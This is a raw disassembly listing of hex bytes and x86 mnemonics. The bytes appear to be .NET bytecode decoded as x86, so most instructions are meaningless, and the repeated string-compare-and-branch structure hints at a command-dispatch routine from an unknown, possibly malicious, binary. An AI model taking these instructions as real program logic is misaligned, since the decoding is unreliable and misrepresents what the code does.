  403670:	28 32                	sub    %dh,(%edx)
  403672:	00 00                	add    %al,(%eax)
  403674:	0a 16                	or     (%esi),%dl
  403676:	fe 01                	incb   (%ecx)
  403678:	13 50 11             	adc    0x11(%eax),%edx
  40367b:	50                   	push   %eax
  40367c:	2c 12                	sub    $0x12,%al
  40367e:	00 16                	add    %dl,(%esi)
  403680:	80 0d 00 00 04 00 dd 	orb    $0xdd,0x40000
  403687:	87 0e                	xchg   %ecx,(%esi)
  403689:	00 00                	add    %al,(%eax)
  40368b:	38 2b                	cmp    %ch,(%ebx)
  40368d:	01 00                	add    %eax,(%eax)
  40368f:	00 00                	add    %al,(%eax)
  403691:	11 3e                	adc    %edi,(%esi)
  403693:	72 65                	jb     0x4036fa
  403695:	08 00                	or     %al,(%eax)
  403697:	70 16                	jo     0x4036af
  403699:	28 32                	sub    %dh,(%edx)
  40369b:	00 00                	add    %al,(%eax)
  40369d:	0a 16                	or     (%esi),%dl
  40369f:	fe 01                	incb   (%ecx)
  4036a1:	13 50 11             	adc    0x11(%eax),%edx
  4036a4:	50                   	push   %eax
  4036a5:	2c 30                	sub    $0x30,%al
  4036a7:	00 72 65             	add    %dh,0x65(%edx)
  4036aa:	08 00                	or     %al,(%eax)
  4036ac:	70 7e                	jo     0x40372c
  4036ae:	24 00                	and    $0x0,%al
  4036b0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4036b3:	17                   	pop    %ss
  4036b4:	00 00                	add    %al,(%eax)
  4036b6:	04 7c                	add    $0x7c,%al
  4036b8:	2f                   	das
  4036b9:	00 00                	add    %al,(%eax)
  4036bb:	04 28                	add    $0x28,%al
  4036bd:	24 00                	and    $0x0,%al
  4036bf:	00 06                	add    %al,(%esi)
  4036c1:	28 43 00             	sub    %al,0x0(%ebx)
  4036c4:	00 0a                	add    %cl,(%edx)
  4036c6:	28 39                	sub    %bh,(%ecx)
  4036c8:	00 00                	add    %al,(%eax)
  4036ca:	06                   	push   %es
  4036cb:	26 00 dd             	es add %bl,%ch
  4036ce:	40                   	inc    %eax
  4036cf:	0e                   	push   %cs
  4036d0:	00 00                	add    %al,(%eax)
  4036d2:	38 e4                	cmp    %ah,%ah
  4036d4:	00 00                	add    %al,(%eax)
  4036d6:	00 00                	add    %al,(%eax)
  4036d8:	11 3e                	adc    %edi,(%esi)
  4036da:	72 13                	jb     0x4036ef
  4036dc:	09 00                	or     %eax,(%eax)
  4036de:	70 16                	jo     0x4036f6
  4036e0:	28 32                	sub    %dh,(%edx)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	0a 16                	or     (%esi),%dl
  4036e6:	fe 01                	incb   (%ecx)
  4036e8:	13 50 11             	adc    0x11(%eax),%edx
  4036eb:	50                   	push   %eax
  4036ec:	39 ca                	cmp    %ecx,%edx
  4036ee:	00 00                	add    %al,(%eax)
  4036f0:	00 00                	add    %al,(%eax)
  4036f2:	00 06                	add    %al,(%esi)
  4036f4:	17                   	pop    %ss
  4036f5:	9a 13 48 00 11 48 72 	lcall  $0x7248,$0x11004813
  4036fc:	1d 09 00 70 16       	sbb    $0x16700009,%eax
  403701:	28 32                	sub    %dh,(%edx)
  403703:	00 00                	add    %al,(%eax)
  403705:	0a 16                	or     (%esi),%dl
  403707:	fe 01                	incb   (%ecx)
  403709:	13 4f 11             	adc    0x11(%edi),%ecx
  40370c:	4f                   	dec    %edi
  40370d:	2c 19                	sub    $0x19,%al
  40370f:	00 06                	add    %al,(%esi)
  403711:	18 9a 06 19 9a 17    	sbb    %bl,0x179a1906(%edx)
  403717:	28 3b                	sub    %bh,(%ebx)
  403719:	00 00                	add    %al,(%eax)
  40371b:	06                   	push   %es
  40371c:	26 00 38             	add    %bh,%es:(%eax)
  40371f:	91                   	xchg   %eax,%ecx
  403720:	00 00                	add    %al,(%eax)
  403722:	00 38                	add    %bh,(%eax)
  403724:	8c 00                	mov    %es,(%eax)
  403726:	00 00                	add    %al,(%eax)
  403728:	00 11                	add    %dl,(%ecx)
  40372a:	48                   	dec    %eax
  40372b:	72 21                	jb     0x40374e
  40372d:	09 00                	or     %eax,(%eax)
  40372f:	70 16                	jo     0x403747
  403731:	28 32                	sub    %dh,(%edx)
  403733:	00 00                	add    %al,(%eax)
  403735:	0a 16                	or     (%esi),%dl
  403737:	fe 01                	incb   (%ecx)
  403739:	13 50 11             	adc    0x11(%eax),%edx
  40373c:	50                   	push   %eax
  40373d:	2c 51                	sub    $0x51,%al
  40373f:	00 06                	add    %al,(%esi)
  403741:	18 9a 06 19 9a 17    	sbb    %bl,0x179a1906(%edx)
  403747:	28 3b                	sub    %bh,(%ebx)
  403749:	00 00                	add    %al,(%eax)
  40374b:	06                   	push   %es
  40374c:	26 72 25             	es jb  0x403774
  40374f:	09 00                	or     %eax,(%eax)
  403751:	70 7e                	jo     0x4037d1
  403753:	24 00                	and    $0x0,%al
  403755:	00 04 06             	add    %al,(%esi,%eax,1)
  403758:	17                   	pop    %ss
  403759:	9a 7e 24 00 00 04 28 	lcall  $0x2804,$0x247e
  403760:	6c                   	insb   (%dx),%es:(%edi)
  403761:	00 00                	add    %al,(%eax)
  403763:	0a 06                	or     (%esi),%al
  403765:	17                   	pop    %ss
  403766:	9a 72 69 00 00 70 28 	lcall  $0x2870,$0x6972
  40376d:	25 00 00 06 28       	and    $0x28060000,%eax
  403772:	0c 00                	or     $0x0,%al
  403774:	00 0a                	add    %cl,(%edx)
  403776:	28 6d 00             	sub    %ch,0x0(%ebp)
  403779:	00 0a                	add    %cl,(%edx)
  40377b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40377e:	00 0a                	add    %cl,(%edx)
  403780:	28 22                	sub    %ah,(%edx)
  403782:	00 00                	add    %al,(%eax)
  403784:	0a 28                	or     (%eax),%ch
  403786:	39 00                	cmp    %eax,(%eax)
  403788:	00 06                	add    %al,(%esi)
  40378a:	26 00 2b             	add    %ch,%es:(%ebx)
  40378d:	26 2b 24 00          	sub    %es:(%eax,%eax,1),%esp
  403791:	11 48 72             	adc    %ecx,0x72(%eax)
  403794:	37                   	aaa
  403795:	09 00                	or     %eax,(%eax)
  403797:	70 16                	jo     0x4037af
  403799:	28 32                	sub    %dh,(%edx)
  40379b:	00 00                	add    %al,(%eax)
  40379d:	0a 16                	or     (%esi),%dl
  40379f:	fe 01                	incb   (%ecx)
  4037a1:	13 50 11             	adc    0x11(%eax),%edx
  4037a4:	50                   	push   %eax
  4037a5:	2c 0d                	sub    $0xd,%al
  4037a7:	00 06                	add    %al,(%esi)
  4037a9:	18 9a 28 22 00 00    	sbb    %bl,0x2228(%edx)
  4037af:	06                   	push   %es
  4037b0:	00 00                	add    %al,(%eax)
  4037b2:	2b 00                	sub    (%eax),%eax
  4037b4:	00 00                	add    %al,(%eax)
  4037b6:	dd 57 0d             	fstl   0xd(%edi)
  4037b9:	00 00                	add    %al,(%eax)
  4037bb:	00 11                	add    %dl,(%ecx)
  4037bd:	07                   	pop    %es
  4037be:	72 3b                	jb     0x4037fb
  4037c0:	09 00                	or     %eax,(%eax)
  4037c2:	70 16                	jo     0x4037da
  4037c4:	28 32                	sub    %dh,(%edx)
  4037c6:	00 00                	add    %al,(%eax)
  4037c8:	0a 16                	or     (%esi),%dl
  4037ca:	fe 01                	incb   (%ecx)
  4037cc:	16                   	push   %ss
  4037cd:	fe 01                	incb   (%ecx)
  4037cf:	13 50 11             	adc    0x11(%eax),%edx
  4037d2:	50                   	push   %eax
  4037d3:	2c 05                	sub    $0x5,%al
  4037d5:	38 a2 01 00 00 00    	cmp    %ah,0x1(%edx)
  4037db:	06                   	push   %es
  4037dc:	18 9a 16 6f 6e 00    	sbb    %bl,0x6e6f16(%edx)
  4037e2:	00 0a                	add    %cl,(%edx)
  4037e4:	1f                   	pop    %ds
  4037e5:	1f                   	pop    %ds
  4037e6:	fe 01                	incb   (%ecx)
  4037e8:	13 50 11             	adc    0x11(%eax),%edx
  4037eb:	50                   	push   %eax
  4037ec:	39 8f 00 00 00 00    	cmp    %ecx,0x0(%edi)
  4037f2:	73 26                	jae    0x40381a
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 13                	or     (%ebx),%dl
  4037f8:	18 06                	sbb    %al,(%esi)
  4037fa:	16                   	push   %ss
  4037fb:	9a 7e 24 00 00 04 06 	lcall  $0x604,$0x247e
  403802:	17                   	pop    %ss
  403803:	9a 7e 24 00 00 04 28 	lcall  $0x2804,$0x247e
  40380a:	6c                   	insb   (%dx),%es:(%edi)
  40380b:	00 00                	add    %al,(%eax)
  40380d:	0a 6f 2b             	or     0x2b(%edi),%ch
  403810:	00 00                	add    %al,(%eax)
  403812:	0a 13                	or     (%ebx),%dl
  403814:	17                   	pop    %ss
  403815:	11 18                	adc    %ebx,(%eax)
  403817:	02 11                	add    (%ecx),%dl
  403819:	17                   	pop    %ss
  40381a:	02 8e b7 11 17 da    	add    -0x25e8ee49(%esi),%cl
  403820:	6f                   	outsl  %ds:(%esi),(%dx)
  403821:	6f                   	outsl  %ds:(%esi),(%dx)
  403822:	00 00                	add    %al,(%eax)
  403824:	0a 00                	or     (%eax),%al
  403826:	11 18                	adc    %ebx,(%eax)
  403828:	6f                   	outsl  %ds:(%esi),(%dx)
  403829:	70 00                	jo     0x40382b
  40382b:	00 0a                	add    %cl,(%edx)
  40382d:	28 3d 00 00 06 0b    	sub    %bh,0xb060000
  403833:	00 dd                	add    %bl,%ch
  403835:	a1 00 00 00 de       	mov    0xde000000,%eax
  40383a:	44                   	inc    %esp
  40383b:	25 28 2c 00 00       	and    $0x2c28,%eax
  403840:	0a 13                	or     (%ebx),%dl
  403842:	1a 00                	sbb    (%eax),%al
  403844:	11 1a                	adc    %ebx,(%edx)
  403846:	13 19                	adc    (%ecx),%ebx
  403848:	72 41                	jb     0x40388b
  40384a:	09 00                	or     %eax,(%eax)
  40384c:	70 7e                	jo     0x4038cc
  40384e:	24 00                	and    $0x0,%al
  403850:	00 04 72             	add    %al,(%edx,%esi,2)
  403853:	49                   	dec    %ecx
  403854:	09 00                	or     %eax,(%eax)
  403856:	70 28                	jo     0x403880
  403858:	43                   	inc    %ebx
  403859:	00 00                	add    %al,(%eax)
  40385b:	0a 28                	or     (%eax),%ch
  40385d:	39 00                	cmp    %eax,(%eax)
  40385f:	00 06                	add    %al,(%esi)
  403861:	26 72 65             	es jb  0x4038c9
  403864:	09 00                	or     %eax,(%eax)
  403866:	70 28                	jo     0x403890
  403868:	39 00                	cmp    %eax,(%eax)
  40386a:	00 06                	add    %al,(%esi)
  40386c:	26 00 28             	add    %ch,%es:(%eax)
  40386f:	2d 00 00 0a dd       	sub    $0xdd0a0000,%eax
  403874:	9a 0c 00 00 28 2d 00 	lcall  $0x2d,$0x2800000c
  40387b:	00 0a                	add    %cl,(%edx)
  40387d:	de 00                	fiadds (%eax)
  40387f:	00 00                	add    %al,(%eax)
  403881:	73 69                	jae    0x4038ec
  403883:	00 00                	add    %al,(%eax)
  403885:	0a 0d 00 09 06 18    	or     0x18060900,%cl
  40388b:	9a 6f 71 00 00 0a 0b 	lcall  $0xb0a,$0x716f
  403892:	de 44 25 28          	fiadds 0x28(%ebp,%eiz,1)
  403896:	2c 00                	sub    $0x0,%al
  403898:	00 0a                	add    %cl,(%edx)
  40389a:	13 1b                	adc    (%ebx),%ebx
  40389c:	00 11                	add    %dl,(%ecx)
  40389e:	1b 13                	sbb    (%ebx),%edx
  4038a0:	1c 72                	sbb    $0x72,%al
  4038a2:	41                   	inc    %ecx
  4038a3:	09 00                	or     %eax,(%eax)
  4038a5:	70 7e                	jo     0x403925
  4038a7:	24 00                	and    $0x0,%al
  4038a9:	00 04 72             	add    %al,(%edx,%esi,2)
  4038ac:	6d                   	insl   (%dx),%es:(%edi)
  4038ad:	09 00                	or     %eax,(%eax)
  4038af:	70 28                	jo     0x4038d9
  4038b1:	43                   	inc    %ebx
  4038b2:	00 00                	add    %al,(%eax)
  4038b4:	0a 28                	or     (%eax),%ch
  4038b6:	39 00                	cmp    %eax,(%eax)
  4038b8:	00 06                	add    %al,(%esi)
  4038ba:	26 72 65             	es jb  0x403922
  4038bd:	09 00                	or     %eax,(%eax)
  4038bf:	70 28                	jo     0x4038e9
  4038c1:	39 00                	cmp    %eax,(%eax)
  4038c3:	00 06                	add    %al,(%esi)
  4038c5:	26 00 28             	add    %ch,%es:(%eax)
  4038c8:	2d 00 00 0a dd       	sub    $0xdd0a0000,%eax
  4038cd:	41                   	inc    %ecx
  4038ce:	0c 00                	or     $0x0,%al
  4038d0:	00 28                	add    %ch,(%eax)
  4038d2:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	00 00                	add    %al,(%eax)
  4038db:	72 65                	jb     0x403942
  4038dd:	09 00                	or     %eax,(%eax)
  4038df:	70 28                	jo     0x403909
  4038e1:	39 00                	cmp    %eax,(%eax)
  4038e3:	00 06                	add    %al,(%esi)
  4038e5:	26 28 72 00          	sub    %dh,%es:0x0(%edx)
  4038e9:	00 0a                	add    %cl,(%edx)
  4038eb:	72 8b                	jb     0x403878
  4038ed:	09 00                	or     %eax,(%eax)
  4038ef:	70 06                	jo     0x4038f7
  4038f1:	17                   	pop    %ss
  4038f2:	9a 28 43 00 00 0a 13 	lcall  $0x130a,$0x4328
  4038f9:	06                   	push   %es
  4038fa:	00 11                	add    %dl,(%ecx)
  4038fc:	06                   	push   %es
  4038fd:	07                   	pop    %es
  4038fe:	28 60 00             	sub    %ah,0x0(%eax)
  403901:	00 0a                	add    %cl,(%edx)
  403903:	00 11                	add    %dl,(%ecx)
  403905:	06                   	push   %es
  403906:	28 55 00             	sub    %dl,0x0(%ebp)
  403909:	00 0a                	add    %cl,(%edx)
  40390b:	26 72 41             	es jb  0x40394f
  40390e:	09 00                	or     %eax,(%eax)
  403910:	70 7e                	jo     0x403990
  403912:	24 00                	and    $0x0,%al
  403914:	00 04 72             	add    %al,(%edx,%esi,2)
  403917:	8f 09 00 70          	(bad)
  40391b:	11 06                	adc    %eax,(%esi)
  40391d:	73 25                	jae    0x403944
  40391f:	00 00                	add    %al,(%eax)
  403921:	0a 6f 30             	or     0x30(%edi),%ch
  403924:	00 00                	add    %al,(%eax)
  403926:	0a 28                	or     (%eax),%ch
  403928:	6c                   	insb   (%dx),%es:(%edi)
  403929:	00 00                	add    %al,(%eax)
  40392b:	0a 28                	or     (%eax),%ch
  40392d:	39 00                	cmp    %eax,(%eax)
  40392f:	00 06                	add    %al,(%esi)
  403931:	26 00 dd             	es add %bl,%ch
  403934:	da 0b                	fimull (%ebx)
  403936:	00 00                	add    %al,(%eax)
  403938:	de 40 25             	fiadds 0x25(%eax)
  40393b:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40393e:	00 0a                	add    %cl,(%edx)
  403940:	13 1d 00 11 1d 13    	adc    0x131d1100,%ebx
  403946:	1e                   	push   %ds
  403947:	72 41                	jb     0x40398a
  403949:	09 00                	or     %eax,(%eax)
  40394b:	70 7e                	jo     0x4039cb
  40394d:	24 00                	and    $0x0,%al
  40394f:	00 04 72             	add    %al,(%edx,%esi,2)
  403952:	a9 09 00 70 11       	test   $0x11700009,%eax
  403957:	1e                   	push   %ds
  403958:	6f                   	outsl  %ds:(%esi),(%dx)
  403959:	73 00                	jae    0x40395b
  40395b:	00 0a                	add    %cl,(%edx)
  40395d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403961:	0a 28                	or     (%eax),%ch
  403963:	39 00                	cmp    %eax,(%eax)
  403965:	00 06                	add    %al,(%esi)
  403967:	26 00 28             	add    %ch,%es:(%eax)
  40396a:	2d 00 00 0a dd       	sub    $0xdd0a0000,%eax
  40396f:	9f                   	lahf
  403970:	0b 00                	or     (%eax),%eax
  403972:	00 28                	add    %ch,(%eax)
  403974:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  403979:	00 00                	add    %al,(%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 11                	add    %dl,(%ecx)
  40397f:	07                   	pop    %es
  403980:	13 49 00             	adc    0x0(%ecx),%ecx
  403983:	11 49 72             	adc    %ecx,0x72(%ecx)
  403986:	c7                   	(bad)
  403987:	09 00                	or     %eax,(%eax)
  403989:	70 16                	jo     0x4039a1
  40398b:	28 32                	sub    %dh,(%edx)
  40398d:	00 00                	add    %al,(%eax)
  40398f:	0a 16                	or     (%esi),%dl
  403991:	fe 01                	incb   (%ecx)
  403993:	13 50 11             	adc    0x11(%eax),%edx
  403996:	50                   	push   %eax
  403997:	39 9c 02 00 00 00 06 	cmp    %ebx,0x6000000(%edx,%eax,1)
  40399e:	17                   	pop    %ss
  40399f:	9a 16 8d 1c 00 00 01 	lcall  $0x100,$0x1c8d16
  4039a6:	28 25 00 00 06 74    	sub    %ah,0x74060000
  4039ac:	08 00                	or     %al,(%eax)
  4039ae:	00 1b                	add    %bl,(%ebx)
  4039b0:	13 1f                	adc    (%edi),%ebx
  4039b2:	06                   	push   %es
  4039b3:	19 9a 6f 2b 00 00    	sbb    %ebx,0x2b6f(%edx)
  4039b9:	0a 1f                	or     (%edi),%bl
  4039bb:	0a fe                	or     %dh,%bh
  4039bd:	04 11                	add    $0x11,%al
  4039bf:	1f                   	pop    %ds
  4039c0:	8e b7 16 fe 01 5f    	mov    0x5f01fe16(%edi),%?
  4039c6:	13 50 11             	adc    0x11(%eax),%edx
  4039c9:	50                   	push   %eax
  4039ca:	2c 4b                	sub    $0x4b,%al
  4039cc:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  4039d2:	13 41 11             	adc    0x11(%ecx),%eax
  4039d5:	41                   	inc    %ecx
  4039d6:	16                   	push   %ss
  4039d7:	72 cf                	jb     0x4039a8
  4039d9:	09 00                	or     %eax,(%eax)
  4039db:	70 a2                	jo     0x40397f
  4039dd:	00 11                	add    %dl,(%ecx)
  4039df:	41                   	inc    %ecx
  4039e0:	17                   	pop    %ss
  4039e1:	7e 24                	jle    0x403a07
  4039e3:	00 00                	add    %al,(%eax)
  4039e5:	04 a2                	add    $0xa2,%al
  4039e7:	00 11                	add    %dl,(%ecx)
  4039e9:	41                   	inc    %ecx
  4039ea:	18 06                	sbb    %al,(%esi)
  4039ec:	17                   	pop    %ss
  4039ed:	9a a2 00 11 41 19 7e 	lcall  $0x7e19,$0x411100a2
  4039f4:	24 00                	and    $0x0,%al
  4039f6:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4039f9:	00 11                	add    %dl,(%ecx)
  4039fb:	41                   	inc    %ecx
  4039fc:	1a 17                	sbb    (%edi),%dl
  4039fe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  403a02:	0a a2 00 11 41 28    	or     0x28411100(%edx),%ah
  403a08:	44                   	inc    %esp
  403a09:	00 00                	add    %al,(%eax)
  403a0b:	0a 28                	or     (%eax),%ch
  403a0d:	39 00                	cmp    %eax,(%eax)
  403a0f:	00 06                	add    %al,(%esi)
  403a11:	26 38 15 02 00 00 00 	cmp    %dl,%es:0x2
  403a18:	06                   	push   %es
  403a19:	19 9a 6f 2b 00 00    	sbb    %ebx,0x2b6f(%edx)
  403a1f:	0a 1f                	or     (%edi),%bl
  403a21:	0a fe                	or     %dh,%bh
  403a23:	02 13                	add    (%ebx),%dl
  403a25:	50                   	push   %eax
  403a26:	11 50 2c             	adc    %edx,0x2c(%eax)
  403a29:	7e 73                	jle    0x403a9e
  403a2b:	26 00 00             	add    %al,%es:(%eax)
  403a2e:	0a 13                	or     (%ebx),%dl
  403a30:	22 1c 8d 23 00 00 01 	and    0x1000023(,%ecx,4),%bl
  403a37:	13 41 11             	adc    0x11(%ecx),%eax
  403a3a:	41                   	inc    %ecx
  403a3b:	16                   	push   %ss
  403a3c:	06                   	push   %es
  403a3d:	16                   	push   %ss
  403a3e:	9a a2 00 11 41 17 7e 	lcall  $0x7e17,$0x411100a2
  403a45:	24 00                	and    $0x0,%al
  403a47:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403a4a:	00 11                	add    %dl,(%ecx)
  403a4c:	41                   	inc    %ecx
  403a4d:	18 06                	sbb    %al,(%esi)
  403a4f:	17                   	pop    %ss
  403a50:	9a a2 00 11 41 19 7e 	lcall  $0x7e19,$0x411100a2
  403a57:	24 00                	and    $0x0,%al
  403a59:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403a5c:	00 11                	add    %dl,(%ecx)
  403a5e:	41                   	inc    %ecx
  403a5f:	1a 06                	sbb    (%esi),%al
  403a61:	18 9a a2 00 11 41    	sbb    %bl,0x411100a2(%edx)
  403a67:	1b 7e 24             	sbb    0x24(%esi),%edi
  403a6a:	00 00                	add    %al,(%eax)
  403a6c:	04 a2                	add    $0xa2,%al
  403a6e:	00 11                	add    %dl,(%ecx)
  403a70:	41                   	inc    %ecx
  403a71:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403a75:	0a 6f 2b             	or     0x2b(%edi),%ch
  403a78:	00 00                	add    %al,(%eax)
  403a7a:	0a 13                	or     (%ebx),%dl
  403a7c:	21 11                	and    %edx,(%ecx)
  403a7e:	22 02                	and    (%edx),%al
  403a80:	11 21                	adc    %esp,(%ecx)
  403a82:	02 8e b7 11 21 da    	add    -0x25deee49(%esi),%cl
  403a88:	6f                   	outsl  %ds:(%esi),(%dx)
  403a89:	6f                   	outsl  %ds:(%esi),(%dx)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 00                	or     (%eax),%al
  403a8e:	11 22                	adc    %esp,(%edx)
  403a90:	6f                   	outsl  %ds:(%esi),(%dx)
  403a91:	70 00                	jo     0x403a93
  403a93:	00 0a                	add    %cl,(%edx)
  403a95:	28 3d 00 00 06 13    	sub    %bh,0x13060000
  403a9b:	1f                   	pop    %ds
  403a9c:	06                   	push   %es
  403a9d:	17                   	pop    %ss
  403a9e:	9a 11 1f 19 28 3b 00 	lcall  $0x3b,$0x28191f11
  403aa5:	00 06                	add    %al,(%esi)
  403aa7:	26 00 1b             	add    %bl,%es:(%ebx)
  403aaa:	8d 23                	lea    (%ebx),%esp
  403aac:	00 00                	add    %al,(%eax)
  403aae:	01 13                	add    %edx,(%ebx)
  403ab0:	41                   	inc    %ecx
  403ab1:	11 41 16             	adc    %eax,0x16(%ecx)
  403ab4:	72 cf                	jb     0x403a85
  403ab6:	09 00                	or     %eax,(%eax)
  403ab8:	70 a2                	jo     0x403a5c
  403aba:	00 11                	add    %dl,(%ecx)
  403abc:	41                   	inc    %ecx
  403abd:	17                   	pop    %ss
  403abe:	7e 24                	jle    0x403ae4
  403ac0:	00 00                	add    %al,(%eax)
  403ac2:	04 a2                	add    $0xa2,%al
  403ac4:	00 11                	add    %dl,(%ecx)
  403ac6:	41                   	inc    %ecx
  403ac7:	18 06                	sbb    %al,(%esi)
  403ac9:	17                   	pop    %ss
  403aca:	9a a2 00 11 41 19 7e 	lcall  $0x7e19,$0x411100a2
  403ad1:	24 00                	and    $0x0,%al
  403ad3:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403ad6:	00 11                	add    %dl,(%ecx)
  403ad8:	41                   	inc    %ecx
  403ad9:	1a 16                	sbb    (%esi),%dl
  403adb:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  403adf:	0a a2 00 11 41 28    	or     0x28411100(%edx),%ah
  403ae5:	44                   	inc    %esp
  403ae6:	00 00                	add    %al,(%eax)
  403ae8:	0a 28                	or     (%eax),%ch
  403aea:	39 00                	cmp    %eax,(%eax)
  403aec:	00 06                	add    %al,(%esi)
  403aee:	26 11 1f             	adc    %ebx,%es:(%edi)
  403af1:	72 d5                	jb     0x403ac8
  403af3:	09 00                	or     %eax,(%eax)
  403af5:	70 28                	jo     0x403b1f
  403af7:	35 00 00 06 28       	xor    $0x28060000,%eax
  403afc:	0c 00                	or     $0x0,%al
  403afe:	00 0a                	add    %cl,(%edx)
  403b00:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403b03:	00 0a                	add    %cl,(%edx)
  403b05:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403b08:	00 0a                	add    %cl,(%edx)
  403b0a:	13 20                	adc    (%eax),%esp
  403b0c:	11 20                	adc    %esp,(%eax)
  403b0e:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403b11:	00 0a                	add    %cl,(%edx)
  403b13:	14 72                	adc    $0x72,%al
  403b15:	d9 09                	(bad) (%ecx)
  403b17:	00 70 17             	add    %dh,0x17(%eax)
  403b1a:	8d 0a                	lea    (%edx),%ecx
  403b1c:	00 00                	add    %al,(%eax)
  403b1e:	01 13                	add    %edx,(%ebx)
  403b20:	44                   	inc    %esp
  403b21:	11 44 16 7e          	adc    %eax,0x7e(%esi,%edx,1)
  403b25:	12 00                	adc    (%eax),%al
  403b27:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403b2a:	00 11                	add    %dl,(%ecx)
  403b2c:	44                   	inc    %esp
  403b2d:	14 14                	adc    $0x14,%al
  403b2f:	28 75 00             	sub    %dh,0x0(%ebp)
  403b32:	00 0a                	add    %cl,(%edx)
  403b34:	00 11                	add    %dl,(%ecx)
  403b36:	20 28                	and    %ch,(%eax)
  403b38:	0c 00                	or     $0x0,%al
  403b3a:	00 0a                	add    %cl,(%edx)
  403b3c:	14 72                	adc    $0x72,%al
  403b3e:	dd 09                	fisttpll (%ecx)
  403b40:	00 70 17             	add    %dh,0x17(%eax)
  403b43:	8d 0a                	lea    (%edx),%ecx
  403b45:	00 00                	add    %al,(%eax)
  403b47:	01 13                	add    %edx,(%ebx)
  403b49:	44                   	inc    %esp
  403b4a:	11 44 16 7e          	adc    %eax,0x7e(%esi,%edx,1)
  403b4e:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  403b53:	00 11                	add    %dl,(%ecx)
  403b55:	44                   	inc    %esp
  403b56:	14 14                	adc    $0x14,%al
  403b58:	28 75 00             	sub    %dh,0x0(%ebp)
  403b5b:	00 0a                	add    %cl,(%edx)
  403b5d:	00 11                	add    %dl,(%ecx)
  403b5f:	20 28                	and    %ch,(%eax)
  403b61:	0c 00                	or     $0x0,%al
  403b63:	00 0a                	add    %cl,(%edx)
  403b65:	14 72                	adc    $0x72,%al
  403b67:	e1 09                	loope  0x403b72
  403b69:	00 70 17             	add    %dh,0x17(%eax)
  403b6c:	8d 0a                	lea    (%edx),%ecx
  403b6e:	00 00                	add    %al,(%eax)
  403b70:	01 13                	add    %edx,(%ebx)
  403b72:	44                   	inc    %esp
  403b73:	11 44 16 06          	adc    %eax,0x6(%esi,%edx,1)
  403b77:	18 9a a2 00 11 44    	sbb    %bl,0x441100a2(%edx)
  403b7d:	14 14                	adc    $0x14,%al
  403b7f:	28 75 00             	sub    %dh,0x0(%ebp)
  403b82:	00 0a                	add    %cl,(%edx)
  403b84:	00 11                	add    %dl,(%ecx)
  403b86:	20 28                	and    %ch,(%eax)
  403b88:	0c 00                	or     $0x0,%al
  403b8a:	00 0a                	add    %cl,(%edx)
  403b8c:	14 72                	adc    $0x72,%al
  403b8e:	e9 09 00 70 16       	jmp    0x16b03b9c
  403b93:	8d 0a                	lea    (%edx),%ecx
  403b95:	00 00                	add    %al,(%eax)
  403b97:	01 14 14             	add    %edx,(%esp,%edx,1)
  403b9a:	14 17                	adc    $0x17,%al
  403b9c:	28 41 00             	sub    %al,0x0(%ecx)
  403b9f:	00 0a                	add    %cl,(%edx)
  403ba1:	26 2b 08             	sub    %es:(%eax),%ecx
  403ba4:	17                   	pop    %ss
  403ba5:	28 36                	sub    %dh,(%esi)
  403ba7:	00 00                	add    %al,(%eax)
  403ba9:	0a 00                	or     (%eax),%al
  403bab:	00 7e 0d             	add    %bh,0xd(%esi)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	04 16                	add    $0x16,%al
  403bb2:	fe 01                	incb   (%ecx)
  403bb4:	8c 42 00             	mov    %es,0x0(%edx)
  403bb7:	00 01                	add    %al,(%ecx)
  403bb9:	11 20                	adc    %esp,(%eax)
  403bbb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403bbe:	00 0a                	add    %cl,(%edx)
  403bc0:	14 72                	adc    $0x72,%al
  403bc2:	f5                   	cmc
  403bc3:	09 00                	or     %eax,(%eax)
  403bc5:	70 16                	jo     0x403bdd
  403bc7:	8d 0a                	lea    (%edx),%ecx
  403bc9:	00 00                	add    %al,(%eax)
  403bcb:	01 14 14             	add    %edx,(%esp,%edx,1)
  403bce:	14 28                	adc    $0x28,%al
  403bd0:	76 00                	jbe    0x403bd2
  403bd2:	00 0a                	add    %cl,(%edx)
  403bd4:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403bd7:	00 0a                	add    %cl,(%edx)
  403bd9:	17                   	pop    %ss
  403bda:	8c 42 00             	mov    %es,0x0(%edx)
  403bdd:	00 01                	add    %al,(%ecx)
  403bdf:	16                   	push   %ss
  403be0:	28 77 00             	sub    %dh,0x0(%edi)
  403be3:	00 0a                	add    %cl,(%edx)
  403be5:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403be8:	00 0a                	add    %cl,(%edx)
  403bea:	28 78 00             	sub    %bh,0x0(%eax)
  403bed:	00 0a                	add    %cl,(%edx)
  403bef:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403bf2:	00 0a                	add    %cl,(%edx)
  403bf4:	28 79 00             	sub    %bh,0x0(%ecx)
  403bf7:	00 0a                	add    %cl,(%edx)
  403bf9:	16                   	push   %ss
  403bfa:	fe 01                	incb   (%ecx)
  403bfc:	13 50 11             	adc    0x11(%eax),%edx
  403bff:	50                   	push   %eax
  403c00:	2d a2 11 20 28       	sub    $0x282011a2,%eax
  403c05:	0c 00                	or     $0x0,%al
  403c07:	00 0a                	add    %cl,(%edx)
